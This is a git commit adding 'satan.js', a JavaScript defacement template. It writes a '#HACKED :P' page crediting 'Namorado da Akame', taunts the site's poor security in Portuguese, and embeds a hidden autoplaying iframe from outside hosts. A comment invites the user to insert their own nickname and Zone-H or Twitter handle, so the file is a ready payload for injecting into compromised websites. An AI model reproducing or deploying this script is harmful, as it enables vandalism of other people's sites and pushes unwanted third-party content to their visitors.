824896c1fab939960525cba26f8a83f819b3d76d
seilakrlh <58865754+seilakrlh@users.noreply.github.com>
2019-12-13 20:06:30 -0300

    Add files via upload

---
+++ satan.js
@@ -0,0 +1,35 @@
+<script type="text/javascript">
+<!--
+
+document.write( '<html>\n' );
+document.write( '<head>\n' );
+document.write( '<link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"http://img.efetividade.net/img/tux-3x4.jpg\">\n' );
+document.write( '<title>#HACKED :P</title>\n' );
+document.write( '</head>\n' );
+document.write( '<body>\n' );
+document.write( '<center>\n' );
+document.write( '\n' );
+document.write( '<center>\n' );
+document.write( '<br>\n' );
+document.write( '</center>\n' );
+document.write( '<br>\n' );
+document.write( '<img src=\"http://i.imgur.com/xg36JN9.jpg\">\n' );
+document.write( '<br>\n' );
+document.write( '<br>\n' );
+document.write( '<!-- YOUR NICKNAME and YOUR ZONE-H or TWITTER -->\n' );
+document.write( '<center><big><big><b>Hacked by <a target=\"_blank\" href=\"http://www.twitter.com/nickname\"><u><font color=\"#000000\">Namorado da Akame</font></u></a></b></big><br>\n' );
+document.write( '<br>\n' );
+document.write( '<font size=\"2\"><b>a segurança desse site é péssima</b> :3</font>\n' );
+document.write( '<br>\n' );
+document.write( '<br>\n' );
+document.write( '<br>\n' );
+document.write( '<iframe src=\"http://www.abmp3.info/playern/player2.php?song=http://freshmp3music.ru/music/09.2012/david_guetta_feat._taped_rai_-_just_one_last_time_(www.freshmp3music.ru).mp3&autoplay=1\" width=\"0\" height=\"21\" style=\"border:0; overflow:hidden\" scrolling=\"no\"></iframe>\n' );
+document.write( '<big><i><big><i><big><i><big><i><big><i><big><i><aceeeeeeeer><!-- www.info-hack3r.blogspot.com --></aceeeeeeeer></i></big></i></big></i></big></i></big></i></big></i></big>\n' );
+document.write( '</big>\n' );
+document.write( '</center>\n' );
+document.write( '</center>\n' );
+document.write( '</body>\n' );
+document.write( '</html>' );
+
+//-->
+</script>
